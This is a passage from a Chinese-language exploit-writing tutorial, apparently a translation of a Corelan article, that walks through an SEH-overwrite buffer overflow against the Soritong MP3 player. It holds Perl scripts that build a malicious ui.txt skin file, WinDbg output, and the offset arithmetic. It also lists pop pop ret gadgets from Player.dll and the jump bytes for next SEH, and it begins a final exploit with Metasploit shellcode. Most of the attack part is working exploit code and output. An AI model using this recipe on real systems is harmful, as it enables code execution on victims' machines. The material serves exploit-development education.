"d3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9".
"Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi".
"6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2B".
"l3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9".
"Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq".
"6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2B".
"t3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9".
"Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By".
"6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2C".
"b3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9".
"Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg".
"6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2C".
"j3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9".
"Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co";
open (myfile,">ui.txt");
print myfile $junk;
创建这个ui.txt文件
用windbg打开程序并运行（g）。调试器会捕获到“first chance exception”，不要在进一步
运行而让程序捕获到“first chance exception”，因为它会改变整个栈空间布局。保持调试器
挂起状态，并观察SEH 链：
0:000> !exchain
0012fd64: +41367440 (41367441)
Invalid exception stack at 35744134
SE Handler 已经被覆盖为41367441.
反序4136744（小端字节序）=>41 74 36 41（字符串At6A的16进制）。和偏移588处的吻合。
我们可以从中得出两个信息：
-SE Handler在588字节后被覆盖
-Next SEH在588-4=584字节后被覆盖。这个位置是0x0012fd64（!exchain输出的）
我们知道我们的shellcode就跟在SE Handler后面。所以shellcode一定位于0012fd64+4+4 bytes
[Junk][next SEH][SEH][Shellcode]
(next SEH位于0x0012fd64处)
目标：Exploit引发一个异常，跳到SEH，在那里将引发另一个异常（pop pop ret）。这会使
执行流程跳回到next SEH。所以我们需要告诉“next SEH”要“跳过接下来的几个字节到你
的shellcode”。这里需要跳过6个字节就行了（或者更多，如果你shellcode开始前有一些nop
的话）。
一个 short jmp的机器码为EB，跟上跳转距离。换言之，跳过6字节的short jmp的机器码为EB
06.我们需要填充4bytes，因此我们加上2个nop。所以我们用0xEB，0x06，0x90，0x90覆盖
“next SEH”。
在于SEH的Exploit中pop pop ret指令串到底是如何起作用的？
当异常发生时，异常分发器创建自己的栈帧。它会把EH Handler成员压入新创的栈帧中（作
为函数起始的一部分）在EH结构中有一个域是EstablisherFrame。这个域指向异常注册记录
（next SEH）的地址并被压入栈中，当一个例程被调用的时候被压入的这个值都是位于
ESP+8的地方。现在如果我们用pop pop ret串的地址覆盖SE Handler：
-第一个pop将弹出栈顶的4 bytes
-接下来的pop继续从栈中弹出4bytes
-最后的ret将把此时ESP所指栈顶中的值（next SEH的地址）放到EIP中。
事实上，next SEH域可以认为是shellcode的第一部分。
编写Exploit-把所有的东西连起来
找到了重要的偏移后，在编写Exploit]前就剩下定位“fake exception”的地址了（pop pop ret）。
当我们在windbg中运行Soritong MP3 player，我们可以看到被加载模块的列表：
ModLoad: 76390000 763ad000 C:\WINDOWS\system32\IMM32.DLL
ModLoad: 773d0000 774d3000 C:\WINDOWS\WinSxS\x86_Microsoft...d4ce83\comctl32.dll
ModLoad: 74720000 7476c000 C:\WINDOWS\system32\MSCTF.dll
ModLoad: 755c0000 755ee000 C:\WINDOWS\system32\msctfime.ime
ModLoad: 72d20000 72d29000 C:\WINDOWS\system32\wdmaud.drv
ModLoad: 77920000 77a13000 C:\WINDOWS\system32\setupapi.dll
ModLoad: 76c30000 76c5e000 C:\WINDOWS\system32\WINTRUST.dll
ModLoad: 77a80000 77b15000 C:\WINDOWS\system32\CRYPT32.dll
ModLoad: 77b20000 77b32000 C:\WINDOWS\system32\MSASN1.dll
ModLoad: 76c90000 76cb8000 C:\WINDOWS\system32\IMAGEHLP.dll
ModLoad: 72d20000 72d29000 C:\WINDOWS\system32\wdmaud.drv
ModLoad: 77920000 77a13000 C:\WINDOWS\system32\setupapi.dll
ModLoad: 72d10000 72d18000 C:\WINDOWS\system32\msacm32.drv
ModLoad: 77be0000 77bf5000 C:\WINDOWS\system32\MSACM32.dll
ModLoad: 77bd0000 77bd7000 C:\WINDOWS\system32\midimap.dll
ModLoad: 10000000 10094000 C:\Program Files\SoriTong\Player.dll
ModLoad: 42100000 42129000 C:\WINDOWS\system32\wmaudsdk.dll
ModLoad: 00f10000 00f5f000 C:\WINDOWS\system32\DRMClien.DLL
ModLoad: 5bc60000 5bca0000 C:\WINDOWS\system32\strmdll.dll
ModLoad: 71ad0000 71ad9000 C:\WINDOWS\system32\WSOCK32.dll
ModLoad: 71ab0000 71ac7000 C:\WINDOWS\system32\WS2_32.dll
ModLoad: 71aa0000 71aa8000 C:\WINDOWS\system32\WS2HELP.dll
ModLoad: 76eb0000 76edf000 C:\WINDOWS\system32\TAPI32.dll
ModLoad: 76e80000 76e8e000 C:\WINDOWS\system32\rtutils.dll
我们只对程序自身的DLL模块感兴趣，让我们在这些DLL里面找pop pop ret。使用findjmp.exe，
我们可以可以在DLL中找pop pop ret指令串（例如：.找pop edi）
下面的随便一个地址都行，只要它不包含NULL bytes
C:\Program Files\SoriTong>c:\findjmp\findjmp.exe Player.dll edi | grep pop | grep -v "000"
0x100104F8 pop edi - pop - retbis
0x100106FB pop edi - pop - ret
0x1001074F pop edi - pop - retbis
0x10010CAB pop edi - pop - ret
0x100116FD pop edi - pop - ret
0x1001263D pop edi - pop - ret
0x100127F8 pop edi - pop - ret
0x1001281F pop edi - pop - ret
0x10012984 pop edi - pop - ret
0x10012DDD pop edi - pop - ret
0x10012E17 pop edi - pop - ret
0x10012E5E pop edi - pop - ret
0x10012E70 pop edi - pop - ret
0x10012F56 pop edi - pop - ret
0x100133B2 pop edi - pop - ret
0x10013878 pop edi - pop - ret
0x100138F7 pop edi - pop - ret
0x10014448 pop edi - pop - ret
0x10014475 pop edi - pop - ret
0x10014499 pop edi - pop - ret
0x100144BF pop edi - pop - ret
0x10016D8C pop edi - pop - ret
0x100173BB pop edi - pop - ret
0x100173C2 pop edi - pop - ret
0x100173C9 pop edi - pop - ret
0x1001824C pop edi - pop - ret
0x10018290 pop edi - pop - ret
0x1001829B pop edi - pop - ret
0x10018DE8 pop edi - pop - ret
0x10018FE7 pop edi - pop - ret
0x10019267 pop edi - pop - ret
0x100192EE pop edi - pop - ret
0x1001930F pop edi - pop - ret
0x100193BD pop edi - pop - ret
0x100193C8 pop edi - pop - ret
0x100193FF pop edi - pop - ret
0x1001941F pop edi - pop - ret
0x1001947D pop edi - pop - ret
0x100194CD pop edi - pop - ret
0x100194D2 pop edi - pop - ret
0x1001B7E9 pop edi - pop - ret
0x1001B883 pop edi - pop - ret
0x1001BDBA pop edi - pop - ret
0x1001BDDC pop edi - pop - ret
0x1001BE3C pop edi - pop - ret
0x1001D86D pop edi - pop - ret
0x1001D8F5 pop edi - pop - ret
0x1001E0C7 pop edi - pop - ret
0x1001E812 pop edi - pop – ret
我们用0x1008de8，它符合我们的需求：
0:000> u 10018de8
Player!Player_Action+0x9528:
10018de8 5f pop edi
10018de9 5e pop esi
10018dea c3 ret
（你也可以使用其他的地址）
提示：正如你在上面看到的那样，findjmp要求你指定一个寄存器。可能Metasploit的msfpescan
更容易使用，它只需要指定DLL和参数-p，然后把结果输出到文件。Msfpescan不要求指定
寄存器，它会获取所有的组合...然后打开输出的文件你就看到地址了。你也可以用memdunp
转储全部进程内存到一个文件夹，接着用msfpescan –M -p 在内存中找所有的pop
pop ret组合。
Exploit payload 必须是下面这样的布局：
[584 characters][0xeb,0x06,0x90,0x90][0x10018de8][NOPs][Shellcode]
junk next SEH current SEH
事实上，很多典型的exploit的结构如下所示：
为了定位shellcode（“应该“紧跟SEH后），你可以替换“next SEH”中的4 bytes为断点。
它可以让你查看寄存器，例如：
my $junk = "A" x 584;
my $nextSEHoverwrite = "\xcc\xcc\xcc\xcc"; #breakpoint
my $SEHoverwrite = pack('V',0x1001E812); #pop pop ret from player.dll
my $shellcode = "1ABCDEFGHIJKLM2ABCDEFGHIJKLM3ABCDEFGHIJKLM";
my $junk2 = "\x90" x 1000;
open(myfile,'>ui.txt');
print myfile $junk.$nextSEHoverwrite.$SEHoverwrite.$shellcode.$junk2;
(e1c.fbc): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00130000 ebx=00000003 ecx=ffffff90 edx=00000090 esi=0017e504 edi=0012fd64
eip=00422e33 esp=0012da14 ebp=0012fd38 iopl=0 nv up ei ng nz ac pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010296
*** WARNING: Unable to verify checksum for SoriTong.exe
*** ERROR: Symbol file could not be found. Defaulted to export symbols for SoriTong.exe -
SoriTong!TmC13_5+0x3ea3:
00422e33 8810 mov byte ptr [eax],dl ds:0023:00130000=41
0:000> g
(e1c.fbc): Break instruction exception - code 80000003 (first chance)
eax=00000000 ebx=00000000 ecx=1001e812 edx=7c9032bc esi=0012d72c edi=7c9032a8
eip=0012fd64 esp=0012d650 ebp=0012d664 iopl=0 nv up ei pl zr na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246
+0x12fd63:
0012fd64 cc int 3
所以，在把异常传给程序后，因为nSEH中的断点而程序被中断
EIP现在指向nSEH中的第一个字节，所以你可以在后面看到和shellcode有关的的8个字节
（nSEH的4 bytes，SEH的4 Bytes）：
0:000> d eip
0012fd64 cc cc cc cc 12 e8 01 10-31 41 42 43 44 45 46 47 ........1ABCDEFG
0012fd74 48 49 4a 4b 4c 4d 32 41-42 43 44 45 46 47 48 49 HIJKLM2ABCDEFGHI
0012fd84 4a 4b 4c 4d 33 41 42 43-44 45 46 47 48 49 4a 4b JKLM3ABCDEFGHIJK
0012fd94 4c 4d 90 90 90 90 90 90-90 90 90 90 90 90 90 90 LM..............
0012fda4 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
0012fdb4 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
0012fdc4 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
0012fdd4 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
漂亮，shellcode在预期中地方出现了。我使用一小段字符串测试shellcode，或许更长一些会
更好（只是验证是否在shellcode中有“holes”）。
现在我们准备编写含真正shellcode的exploit（和用jumpcode替换nSEH域中的断点）。
# Exploit for Soritong MP3 player
#
# Written by Peter Van Eeckhoutte
# http://www.corelan.be:8800
#
#
my $junk = "A" x 584;
my $nextSEHoverwrite = "\xeb\x06\x90\x90"; #jump 6 bytes
my $SEHoverwrite = pack('V',0x1001E812); #pop pop ret from player.dll
# win32_exec - EXITFUNC=seh CMD=calc Size=343 Encoder=PexAlphaNum http://metasploit.com
my $shellcode =
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49".
"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36".